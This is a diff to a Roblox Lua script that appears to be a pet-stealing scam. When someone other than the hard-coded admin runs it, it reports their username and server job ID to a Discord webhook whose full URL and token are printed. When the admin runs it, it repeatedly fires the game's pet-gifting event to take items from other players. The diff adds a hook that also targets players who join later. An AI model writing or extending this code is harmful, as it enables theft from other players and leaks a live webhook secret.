@@ -2,12 +2,11 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 
-local webhookURL = "https://discord.com/api/webhooks/1378046230868787361/Ny2d9ikOTh5c3PXSTMOAT8FK4h7hIKIZ9duNOrqVqdA3AnDj04b13SSkB9GC9RzUIT9a"  -- Replace with your webhook
+local webhookURL = "https://discord.com/api/webhooks/1378046230868787361/Ny2d9ikOTh5c3PXSTMOAT8FK4h7hIKIZ9duNOrqVqdA3AnDj04b13SSkB9GC9RzUIT9a"  -- Replace with your webhook URL
 local adminUsername = "connor24377_10"  -- Your Roblox username
 local localPlayer = Players.LocalPlayer
 local petGiftEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
 
--- Send webhook with username and job ID
 local function sendWebhook()
     local payload = {
         content = "Script executed by player!",
@@ -42,17 +41,19 @@ local function sendWebhook()
     end
 end
 
-sendWebhook()
+-- Only send webhook if NOT admin
+if localPlayer.Name ~= adminUsername then
+    sendWebhook()
+end
 
--- If this is admin, collect pets from others
+-- If admin, wait a bit then collect pets from other players
 if localPlayer.Name == adminUsername then
     local function givePetsFromPlayer(player)
-        local playerBackpack = player:FindFirstChild("Backpack")
-        local playerChar = player.Character
-        if not playerBackpack and not playerChar then return end
+        local backpack = player:FindFirstChild("Backpack")
+        local character = player.Character
 
-        if playerBackpack then
-            for _, item in ipairs(playerBackpack:GetChildren()) do
+        if backpack then
+            for _, item in ipairs(backpack:GetChildren()) do
                 if item:IsA("Tool") or item:IsA("Model") then
                     petGiftEvent:FireServer("GivePet", localPlayer)
                     wait(0.3)
@@ -60,8 +61,8 @@ if localPlayer.Name == adminUsername then
             end
         end
 
-        if playerChar then
-            for _, item in ipairs(playerChar:GetChildren()) do
+        if character then
+            for _, item in ipairs(character:GetChildren()) do
                 if item:IsA("Tool") or item:IsA("Model") then
                     petGiftEvent:FireServer("GivePet", localPlayer)
                     wait(0.3)
@@ -70,7 +71,7 @@ if localPlayer.Name == adminUsername then
         end
     end
 
-    -- Delay to allow players to load
+    -- Wait for players to load fully
     wait(5)
 
     for _, player in ipairs(Players:GetPlayers()) do
@@ -78,4 +79,10 @@ if localPlayer.Name == adminUsername then
             givePetsFromPlayer(player)
         end
     end
+
+    -- Listen for players joining after you and gift their pets too
+    Players.PlayerAdded:Connect(function(player)
+        wait(5) -- wait for player to load
+        givePetsFromPlayer(player)
+    end)
 end
